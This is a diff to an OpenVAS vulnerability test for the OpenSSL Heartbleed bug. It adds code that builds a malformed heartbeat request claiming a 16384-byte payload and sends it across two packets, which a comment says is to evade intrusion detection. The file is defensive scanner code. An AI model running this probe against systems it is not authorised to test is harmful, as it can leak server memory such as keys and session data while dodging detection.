@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_openssl_heartbeat_66690.nasl 13434 2019-02-04 09:55:38Z cfischer $
+# $Id: gb_openssl_heartbeat_66690.nasl 13754 2019-02-19 10:35:55Z cfischer $
 #
 # SSL/TLS: OpenSSL TLS 'heartbeat' Extension Information Disclosure Vulnerability
 #
@@ -28,12 +28,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103936");
-  script_version("$Revision: 13434 $");
+  script_version("$Revision: 13754 $");
   script_bugtraq_id(66690);
   script_cve_id("CVE-2014-0160");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2019-02-04 10:55:38 +0100 (Mon, 04 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-19 11:35:55 +0100 (Tue, 19 Feb 2019) $");
   script_tag(name:"creation_date", value:"2014-04-09 09:54:09 +0200 (Wed, 09 Apr 2014)");
   script_name("SSL/TLS: OpenSSL TLS 'heartbeat' Extension Information Disclosure Vulnerability");
   script_category(ACT_ATTACK);
@@ -71,15 +71,96 @@ include("mysql.inc"); # For recv_mysql_server_handshake() in open_ssl_socket()
 include("misc_func.inc");
 include("byte_func.inc");
 include("ssl_funcs.inc");
-include("gb_openssl_heartbeat.inc");
+
+function _broken_heartbeat( version, vtstring ) {
+
+  local_var version, vtstring;
+  local_var hb, payload;
+
+  if( ! version )
+    version = version = TLS_10;
+
+  payload = raw_string( 0x01 ) + raw_string( 16384 / 256, 16384 % 256 ) + crap( length:16 ) + '------------------------->' + vtstring + '<-------------------------';
+  hb = version + data_len( data:payload ) + payload;
+  return hb;
+}
+
+function test_hb( port, version, vtstring ) {
+
+  local_var port, version, vtstring;
+  local_var soc, hello, data, record, hello_done, v, hb, d;
+
+  soc = open_ssl_socket( port:port );
+  if( ! soc )
+    return FALSE;
+
+  hello = ssl_hello( version:version, extensions:make_list( "heartbeat" ) );
+  if( ! hello ) {
+    close( soc );
+    return FALSE;
+  }
+
+  send( socket:soc, data:hello );
+
+  while ( ! hello_done ) {
+    data = ssl_recv( socket:soc );
+    if( ! data ) {
+      close( soc );
+      return FALSE;
+    }
+
+    record = search_ssl_record( data:data, search:make_array( "handshake_typ", SSLv3_SERVER_HELLO ) );
+    if( record ) {
+      if( record['extension_heartbeat_mode'] != 1  ) {
+        close( soc );
+        return;
+      }
+    }
+
+    record = search_ssl_record( data:data, search:make_array( "handshake_typ", SSLv3_SERVER_HELLO_DONE ) );
+    if( record ) {
+      hello_done = TRUE;
+      v = record["version"];
+      break;
+    }
+  }
+
+  if( ! hello_done ) {
+    close( soc );
+    return FALSE;
+  }
+
+  # send heartbeat request in two packets to
+  # work around stupid IDS which try to detect
+  # attack by matching packets only
+  hb = _broken_heartbeat( version:version, vtstring:vtstring );
+
+  send( socket:soc, data:raw_string( 0x18 ) );
+  send( socket:soc, data:hb );
+
+  d = ssl_recv( socket:soc );
+
+  if( strlen( d ) > 3 && string( "->", vtstring, "<-" ) >< d ) {
+    security_message( port:port );
+    exit( 0 );
+  }
+
+  if( soc )
+    close( soc );
+
+  return;
+}
 
 port = get_ssl_port();
-if( ! port ) exit( 0 );
+if( ! port )
+  exit( 0 );
 
-if( ! versions = get_supported_tls_versions( port:port, min:SSL_v3, max:TLS_12 ) ) exit( 0 );
+if( ! versions = get_supported_tls_versions( port:port, min:SSL_v3, max:TLS_12 ) )
+  exit( 0 );
 
+vt_strings = get_vt_strings();
 foreach version( versions ) {
-  test_hb( port:port, version:version );
+  test_hb( port:port, version:version, vtstring:vt_strings["default"] );
 }
 
 exit( 99 );
